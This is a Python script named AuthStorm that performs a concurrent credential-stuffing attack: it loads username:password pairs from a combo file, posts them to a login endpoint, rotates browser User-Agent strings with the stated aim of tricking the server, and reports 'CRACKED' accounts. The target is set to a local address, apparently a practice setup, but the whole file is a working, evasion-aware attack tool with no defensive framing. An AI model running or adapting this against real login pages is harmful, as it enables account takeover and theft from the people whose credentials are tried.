import asyncio
import aiohttp
import time
import random
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURATION ---
# List of common User-Agents to trick the server
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

class AuthStorm:
    def __init__(self, target_url, concurrency=5):
        self.target_url = target_url
        self.semaphore = asyncio.Semaphore(concurrency)

    async def attempt_login(self, session, username, password):
        payload = {"username": username, "password": password}
        
        # Select a random browser for this request
        headers = {"User-Agent": random.choice(USER_AGENTS)}

        async with self.semaphore:
            try:
                # We now pass 'headers' to the request
                async with session.post(self.target_url, json=payload, headers=headers) as response:
                    if response.status == 200:
                        print(f"{Fore.GREEN}[+] CRACKED: {username} : {password}")
                        return True
                    elif response.status == 401:
                        print(f"{Fore.RED}.", end="", flush=True)
                        return False
                    else:
                        print(f"{Fore.YELLOW}[?] Status: {response.status}")
                        return False
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}")
                return False

    async def start_attack(self, combo_file):
        print(f"{Fore.BLUE}[*] Loading credentials from {combo_file}...")
        
        # Read the file
        try:
            with open(combo_file, "r") as f:
                lines = f.readlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found!")
            return

        # Parse the file (user:pass)
        combo_list = []
        for line in lines:
            if ":" in line:
                parts = line.strip().split(":", 1)
                combo_list.append((parts[0], parts[1]))

        print(f"{Fore.BLUE}[*] Starting Stealth Attack against {self.target_url}")
        start_time = time.time()

        async with aiohttp.ClientSession() as session:
            tasks = []
            for user, password in combo_list:
                task = asyncio.create_task(self.attempt_login(session, user, password))
                tasks.append(task)
            await asyncio.gather(*tasks)

        duration = time.time() - start_time
        print(f"\n{Fore.WHITE}--- FINISHED ---")
        print(f"Time: {duration:.2f}s")

if __name__ == "__main__":
    TARGET = "http://127.0.0.1:5000/login"
    # Now we use the file instead of the hardcoded list
    engine = AuthStorm(target_url=TARGET, concurrency=5)
    asyncio.run(engine.start_attack("combo.txt"))